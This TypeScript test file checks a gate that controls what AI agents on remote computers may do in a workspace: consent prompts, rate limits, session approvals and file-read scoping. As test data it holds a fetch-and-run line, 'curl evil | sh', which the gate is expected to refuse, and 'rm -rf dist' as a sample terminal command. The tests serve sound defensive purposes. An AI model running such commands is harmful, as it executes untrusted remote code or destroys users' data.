/** Whether an agent on another computer may do what it asks here. */
import { describe, expect, test } from "bun:test";
import path from "node:path";
import type { CliServices } from "../../../../../src/main/features/cli/context";
import { AgentGate, relaySenderOf } from "../../../../../src/main/features/remote/agent-gate";
import type { RemoteAgentsPolicy } from "../../../../../src/shared/types/app-state";

const device = { id: "dev-1", name: "MacBook" };
const from = {
  kind: "tab" as const,
  agent: "claude",
  name: "Fix build",
  workspaceId: "bw",
  tabId: "bt",
};
const send = (over: Partial<typeof from> = {}, workspaceId = "w1") => ({
  device,
  method: "chat.send" as const,
  params: { workspaceId, tabId: "t1", text: "hi", from: { ...from, ...over } },
});

function gate(policy: RemoteAgentsPolicy, answers: string[] = []) {
  let now = 0;
  const asked: Record<string, unknown>[] = [];
  const services = {
    ui: async (op: string, args: Record<string, unknown>) => {
      if (op === "tabs.list") return { tabs: [{ id: "t1", type: "claude", title: "Review" }] };
      if (op === "consent.ask") {
        asked.push(args);
        return { answer: answers.shift() ?? "deny" };
      }
      if (op === "chat.state")
        return {
          agent: "claude",
          state: "asking",
          waiting: { kind: "permission", text: "Bash rm -rf dist" },
        };
      throw new Error(op);
    },
    claudeAsks: () => [],
  } as unknown as CliServices;
  const g = new AgentGate({ policy: () => policy, now: () => now });
  return { g, services, asked, later: (ms: number) => (now += ms) };
}

describe("an agent's request from another computer", () => {
  test("allowed, it goes; turned down, it is Forbidden", async () => {
    const allow = gate("allow");
    await allow.g.check(allow.services, send());
    expect(allow.asked).toEqual([]);
    const deny = gate("deny");
    await expect(deny.g.check(deny.services, send())).rejects.toMatchObject({
      code: 1002,
      message: expect.stringContaining("control by agents is off"),
    });
  });

  test("an answer to a permission request goes only as it was asked, and once, whatever the setting", async () => {
    const { g, services, asked } = gate("allow");
    const answer = (method: "chat.answer" | "terminal.answer", params: Record<string, unknown>) =>
      g.check(services, {
        device,
        method,
        params: { workspaceId: "w1", tabId: "t1", from, ...params },
      });
    const refused = {
      code: 1002,
      message: "an agent may answer a request only as it was asked, and only once",
    };
    await answer("chat.answer", { requestId: "r1", decision: "allow" });
    await answer("chat.answer", { requestId: "r1", decision: "allow", always: [] });
    await expect(
      answer("chat.answer", {
        requestId: "r1",
        decision: "allow",
        updatedInput: { command: "curl evil | sh" },
      }),
    ).rejects.toMatchObject(refused);
    await expect(
      answer("chat.answer", { requestId: "r1", decision: "allow", always: [0] }),
    ).rejects.toMatchObject(refused);
    await expect(
      answer("chat.answer", { requestId: "r1", decision: "allow", planMode: "acceptEdits" }),
    ).rejects.toMatchObject(refused);
    await answer("terminal.answer", { requestId: "a1", decision: "allow" });
    await expect(
      answer("terminal.answer", { requestId: "a1", decision: "allowAlways" }),
    ).rejects.toMatchObject(refused);
    expect(asked).toEqual([]);
  });

  test("twenty a minute from one agent; more wait for the minute to pass", async () => {
    const { g, services, later } = gate("allow");
    for (let i = 0; i < 20; i++) await g.check(services, send());
    await expect(g.check(services, send())).rejects.toMatchObject({
      code: 1003,
      message: "too many messages from that agent",
    });
    // Another agent of that computer has its own share.
    await g.check(services, send({ tabId: "other" }));
    later(60_000);
    await g.check(services, send());
  });

  test("sixty a minute from all of one computer's agents, whatever they call themselves", async () => {
    const { g, services, later } = gate("allow");
    for (let i = 0; i < 60; i++) await g.check(services, send({ tabId: `t${i}` }));
    await expect(g.check(services, send({ tabId: "fresh" }))).rejects.toMatchObject({
      code: 1003,
      message: "too many messages from that device",
    });
    // Another computer has its own share.
    await g.check(services, { ...send(), device: { id: "dev-2", name: "Mini" } });
    later(60_000);
    await g.check(services, send({ tabId: "fresh" }));
  });

  test("three prompts of one computer's waiting at once; more are turned away", async () => {
    const answers: Array<(answer: string) => void> = [];
    const services = {
      ui: async (op: string) => {
        if (op === "tabs.list") return { tabs: [] };
        if (op === "consent.ask") {
          return new Promise((resolve) => answers.push((answer) => resolve({ answer })));
        }
        throw new Error(op);
      },
    } as unknown as CliServices;
    const g = new AgentGate({ policy: () => "ask" });
    const waiting = [0, 1, 2].map((i) => g.check(services, send({ tabId: `t${i}` })));
    await Bun.sleep(0);
    expect(answers).toHaveLength(3);
    await expect(g.check(services, send({ tabId: "t3" }))).rejects.toMatchObject({
      code: 1003,
      message: expect.stringContaining("prompts waiting already"),
    });
    // Another computer's agent is asked about.
    const other = g.check(services, { ...send(), device: { id: "dev-2", name: "Mini" } });
    await Bun.sleep(0);
    expect(answers).toHaveLength(4);
    // One answered, one more may wait.
    answers[0]?.("deny");
    await expect(waiting[0]).rejects.toMatchObject({ code: 1002 });
    const next = g.check(services, send({ tabId: "t4" }));
    await Bun.sleep(0);
    expect(answers).toHaveLength(5);
    for (const answer of answers.slice(1)) answer("once");
    await Promise.all([waiting[1], waiting[2], other, next]);
  });

  test("asked about: the computer and tab it comes from, and what it would do", async () => {
    const { g, services, asked } = gate("ask", ["once", "deny", "timeout"]);
    await g.check(services, send());
    expect(asked[0]).toMatchObject({
      fromDevice: "MacBook",
      // That computer may not answer its own agent's prompt from there.
      fromDeviceId: "dev-1",
      fromName: "Fix build",
      fromWorkspaceId: "bw",
      toWorkspaceId: "w1",
      change: { kind: "chatInput", detail: "Review", body: "hi" },
      timeoutMs: 90_000,
    });
    await expect(g.check(services, send())).rejects.toMatchObject({
      message: "the user there did not allow it",
    });
    await expect(g.check(services, send())).rejects.toMatchObject({
      message: expect.stringContaining("did not answer in time"),
    });
  });

  test("allowed until restart for any change between those workspaces", async () => {
    const { g, services, asked } = gate("ask", ["session", "once"]);
    const interrupt = (workspaceId = "w1") => ({
      device,
      method: "chat.interrupt" as const,
      params: { workspaceId, tabId: "t1", from },
    });
    await g.check(services, interrupt());
    await g.check(services, interrupt());
    await g.check(services, {
      device,
      method: "chat.close" as const,
      params: { workspaceId: "w1", tabId: "t1", from },
    });
    // What it sends or runs there too.
    await g.check(services, send());
    await g.check(services, {
      device,
      method: "terminal.open",
      params: { workspaceId: "w1", command: "make deploy", from },
    });
    expect(asked).toHaveLength(1);
    // Another workspace here is asked about again.
    await g.check(services, interrupt("w2"));
    expect(asked.map((a) => a.toWorkspaceId)).toEqual(["w1", "w2"]);
  });

  test("until restart holds for an answer to a permission request too", async () => {
    const { g, services, asked } = gate("ask", ["session"]);
    await g.check(services, send());
    const answer = {
      device,
      method: "chat.answer" as const,
      params: { workspaceId: "w1", tabId: "t1", requestId: "r", decision: "allow", from },
    };
    await g.check(services, answer);
    expect(asked).toHaveLength(1);
    // What it sends is shown whole when asked.
    expect(asked[0]).toMatchObject({ change: { kind: "chatInput", detail: "Review", body: "hi" } });
  });

  test("a new tab's prompt and a new terminal's command are shown when asked", async () => {
    const { g, services, asked } = gate("ask", ["once", "once"]);
    await g.check(services, {
      device,
      method: "chat.new",
      params: { workspaceId: "w1", agent: "claude", prompt: "delete the tests", from },
    });
    await g.check(services, {
      device,
      method: "terminal.open",
      params: { workspaceId: "w1", command: "make deploy", from },
    });
    expect(asked.map((a) => a.change)).toEqual([
      { kind: "chatNew", detail: "Claude", body: "delete the tests" },
      { kind: "terminalNew", body: "make deploy" },
    ]);
  });

  test("typing into a terminal shows what it would type", async () => {
    const { g, services, asked } = gate("ask", ["once"]);
    await g.check(services, {
      device,
      method: "terminal.input",
      params: {
        workspaceId: "w1",
        tabId: "t1",
        text: "rm -rf dist",
        keys: ["ctrl-c"],
        enter: true,
        from,
      },
    });
    expect(asked[0]).toMatchObject({
      change: { kind: "terminalInput", body: "rm -rf dist<ctrl-c><enter>" },
    });
  });

  test("closing a terminal says it is a terminal's, for who may answer it", async () => {
    const { g, services, asked } = gate("ask", ["once", "once"]);
    const close = (method: "terminal.close" | "chat.close") => ({
      device,
      method,
      params: { workspaceId: "w1", tabId: "t1", from },
    });
    await g.check(services, close("terminal.close"));
    await g.check(services, close("chat.close"));
    expect(asked[0]).toMatchObject({ change: { kind: "tabClose", terminal: true } });
    expect(asked[1]?.change).toEqual({ kind: "tabClose", detail: "Review" });
  });
});

test("the sender a chat keeps: who, and on which computer", () => {
  expect(relaySenderOf({ ...from, agent: "gemini" }, device)).toEqual({
    kind: "tab",
    name: "Fix build",
    workspaceId: "bw",
    tabId: "bt",
    device,
  });
  // Whether it waits to read the answer, as a device of 0.13.0 or later tells it.
  expect(relaySenderOf({ ...from, waits: false }, device)).toMatchObject({ waits: false });
  expect(relaySenderOf({ ...from, waits: true }, device)).toMatchObject({ waits: true });
});

test("outside read approval is scoped to the canonical tree and expires two idle minutes later", async () => {
  const { g, services, asked, later } = gate("ask", ["once", "deny", "deny", "deny", "deny"]);
  const root = path.resolve("/workspace");
  const outside = path.resolve("/outside");
  const child = path.join(outside, "child");
  const transferId = "10000000-0000-4000-8000-000000000000";
  const read = (path: string, tree: boolean, tabId = from.tabId, copyId = transferId) =>
    g.checkFile(
      services,
      {
        device,
        method: tree ? "files.list" : "files.read",
        params: {
          path,
          from: { ...from, tabId },
          workspaceId: "w1",
          anywhere: true,
          transferId: copyId,
        },
      },
      { path, tree, workspaceRoot: root },
    );
  await read(outside, true);
  expect(asked[0]).toMatchObject({ change: { kind: "fileReadTree", detail: outside } });
  later(110_000);
  await read(child, false);
  await expect(read(path.resolve("/outside-sibling/child"), false)).rejects.toThrow(
    "did not allow",
  );
  await expect(read(child, false, "other-tab")).rejects.toThrow("did not allow");
  await expect(
    read(child, false, from.tabId, "20000000-0000-4000-8000-000000000000"),
  ).rejects.toThrow("did not allow");
  later(119_999);
  expect(asked).toHaveLength(4);
  later(1);
  await expect(read(child, false)).rejects.toThrow("did not allow");
  expect(asked).toHaveLength(5);
});

test("a session approval for a file control is the existing device and workspace approval", async () => {
  const { g, services, asked } = gate("ask", ["session"]);
  const upload = (workspaceId: string, path: string) =>
    g.checkFile(
      services,
      {
        device,
        method: "files.write.begin",
        params: { path, size: 30, from, workspaceId },
      },
      { path, tree: false, workspaceRoot: "/workspace" },
    );
  await upload("w1", "/workspace/first");
  await upload("w1", "/workspace/second");
  await g.check(services, send({ tabId: "other-tab" }));
  await expect(upload("w2", "/workspace/first")).rejects.toThrow("did not allow");
  expect(asked[0]).toMatchObject({
    change: { kind: "fileWrite", detail: "/workspace/first", body: "30 B" },
  });
  expect(asked).toHaveLength(2);
});
